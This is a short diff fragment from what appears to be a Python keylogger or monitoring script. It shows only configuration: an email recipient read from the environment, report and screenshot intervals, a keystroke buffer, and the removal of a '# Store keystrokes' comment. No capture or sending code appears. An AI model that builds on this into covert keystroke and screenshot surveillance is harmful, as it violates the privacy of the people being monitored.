@@ -39,8 +39,6 @@ EMAIL_RECEIVER = os.getenv("RECIEVER_EMAIL")
 monitoring = False
 report_interval = 60
 screenshot_interval = 30
-
-# Store keystrokes
 keystroke_data = []
 
 
